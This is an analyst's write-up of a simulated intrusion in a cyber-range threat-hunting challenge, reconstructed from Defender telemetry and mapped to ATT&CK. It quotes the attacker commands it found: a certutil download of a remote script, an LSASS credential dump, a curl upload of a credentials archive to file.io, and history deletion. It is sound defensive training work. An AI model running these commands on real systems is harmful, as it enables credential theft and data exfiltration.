# SOC Incident Investigation – Azuki Import/Export Compromise

**Analyst:** Steven Cruz  
**Source:** Cyber Range SOC Challenge  
**System:** azuki-fileserver01

---

## Overview
This investigation analyzes a simulated intrusion against Azuki Import/Export (梓貿易株式会社) as part of the Cargo Hold threat-hunting exercise in the Azuki Breach Saga.
The scenario provides participants with Microsoft Defender for Endpoint (MDE) telemetry from a compromised environment,
requiring analysts to identify attacker actions across the kill chain—from initial access to exfiltration and anti-forensics.

## Scenario Context
Attackers initially gained access to an Azuki workstation on November 19, establishing a foothold before going dormant for approximately 72 hours.
Upon returning, they conducted lateral movement toward high-value assets, staged data for exfiltration, deployed persistence mechanisms, and attempted to remove forensic evidence.

## Data Sources
All findings were derived exclusively from Microsoft Defender for Endpoint Advanced Hunting logs, including:

- DeviceProcessEvents

- DeviceFileEvents

- DeviceLogonEvents

- DeviceRegistryEvents

- DeviceNetworkEvents

No host access, file content review, or endpoint imaging was required; all conclusions were driven by log-based hunting and correlation.

## Scope of Investigation
The objective of this hunt was to:

- Identify attacker behaviors mapped to MITRE ATT&CK

- Validate compromised accounts, hosts, staging directories, toolsets, and exfiltration channels

- Interpret attacker methodology based solely on MDE telemetry

- Produce high-confidence answers for each step of the adversary workflow

This report documents each phase of the intrusion and the analytical steps taken to identify the Indicators of Compromise (IOCs) and behavioral patterns used throughout the attack.

---

# TIMELINE OF ATTACKER ACTIVITY

This timeline consolidates attacker behaviors observed across MDE telemetry. Each entry represents a confirmed activity tied to a specific phase of the intrusion.

---

### Initial Access & Return Activity

Nov 19, 2025 7:10:42 PM

System: azuki-fileserver01

Account: fileadmin

Event: Successful remote logon from 10.10.1.204

Technique: Initial Access / Lateral Movement (T1021)

Nov 22, 2025 12:27:53 AM

System: azuki-sl

Account: kenji.sato

Event: External logon from 159.26.106.98

Technique: Initial Access (TA0001)

---

### Lateral Movement to File Server

Nov 22, 2025 12:11:14 AM

System: azuki-fileserver01

Account: fileadmin

Event: Remote logon from 10.0.8.4

Technique: Remote Services (T1021)

---

### System & Network Discovery
| Timestamp   | Command                 | Technique                        |
| ----------- | ----------------------- | -------------------------------- |
| 12:40:54 AM | `net share`             | Local Share Discovery (T1135)    |
| 12:42:01 AM | `net view \\10.1.0.188` | Remote Share Discovery (T1135)   |
| 12:40:09 AM | `whoami /all`           | Privilege Discovery (T1033)      |
| 12:42:46 AM | `ipconfig /all`         | Network Config Discovery (T1016) |

Device: azuki-fileserver01 — Account: fileadmin

---

### Defense Evasion

12:55:43 AM

Command: ``` attrib +h +s C:\Windows\Logs\CBS ```

Purpose: Hide staging folder

Technique: Hidden Files & Directories (T1564.001)

---

### Ingress Tool Transfer

12:58:24 AM

Command: `certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

Technique: Ingress Tool Transfer (T1105)

Device: azuki-fileserver01 — Account: fileadmin

---

### Collection & Data Staging

1:06:03 AM

Command: `xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`

Technique: Automated Collection (T1119)

1:07:53 AM

File Created: IT-Admin-Passwords.csv

Technique: Credentials Harvesting (T1552)

---

### Compression of Staged Data

1:25:31 AM

Command: `tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

Technique: Archive Collected Data (T1560.001)

---

### Credential Access

~2:24:47 AM

Command: `pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`

Output: lsass.dmp memory dump

Technique: OS Credential Dumping (T1003.001)

---

### Exfiltration to Cloud Storage

2:06:08 AM

Command: `curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

Technique: Exfiltration to Cloud Storage (T1567.002)

---

### Persistence Mechanism

Registry Modification Timestamp (from Query E)

Key Value: FileShareSync (Run key)

Payload: svchost.ps1

Technique: Registry Run Keys (T1547.001)

---

### Anti-Forensics / Cleanup

2:26:01 AM

File Deleted: ConsoleHost_history.txt

Technique: Clear Command History (T1070.003)

---

# EXECUTIVE SUMMARY

The Cargo Hold hunt provided telemetry from a live intrusion against Azuki Import/Export (梓貿易株式会社). Using only Microsoft Defender for Endpoint Advanced Hunting logs, this investigation successfully identified:

- The attacker’s return infrastructure

- Lateral movement to a file server

- Discovery of network resources and permissions

- Credential harvesting from LSASS memory

- Collection and staging of sensitive data

- Compression and exfiltration to a cloud service

- Setup of persistence, masquerading as legitimate components

- Cleanup actions designed to hinder forensic review

--- 

### Key Findings

| Category                 | Confirmed Findings                                                |
| ------------------------ | ----------------------------------------------------------------- |
| **Initial Access**       | Adversary re-entered via external IP (**159.26.106.98**)          |
| **Privilege Abuse**      | Compromised admin account: **fileadmin**                          |
| **High-Value Targeting** | File server accessed: **azuki-fileserver01**                      |
| **Credential Theft**     | LSASS dumped to `C:\Windows\Logs\CBS\lsass.dmp`                   |
| **Staging Location**     | Hidden directory: `C:\Windows\Logs\CBS\`                          |
| **Data Theft**           | Archive exfiltrated via **file.io** using `curl`                  |
| **Persistence**          | Registry autorun value: **FileShareSync** executing `svchost.ps1` |
| **Anti-Forensics**       | PowerShell history deleted (`ConsoleHost_history.txt`)            |

---

### Analyst Capabilities Demonstrated

| Skill Area               | Demonstration                                            |
| ------------------------ | -------------------------------------------------------- |
| Endpoint threat hunting  | Correlating multi-host attacker activity using MDE       |
| Log-driven investigation | Full kill-chain reconstruction from telemetry alone      |
| MITRE ATT&CK mapping     | 20 distinct techniques identified & aligned              |
| IOC extraction           | IPs, commands, filenames, registry values, staging paths |
| Forensics awareness      | Recognition of persistence and anti-forensic evidence    |
| Reporting quality        | Structured narrative suitable for SOC leadership         |

---

### Adversary Intent Assessment

The adversary’s actions indicate:

- Integrity & Confidentiality loss involving privileged credentials

- Targeted collection of sensitive business data

- Efforts to remain persistent and stealthy within the environment

- Ability to destroy evidence and hinder IR reconstruction

---

# Flag by Flag Detail

## FLAG 1 — INITIAL ACCESS: Return Connection Source


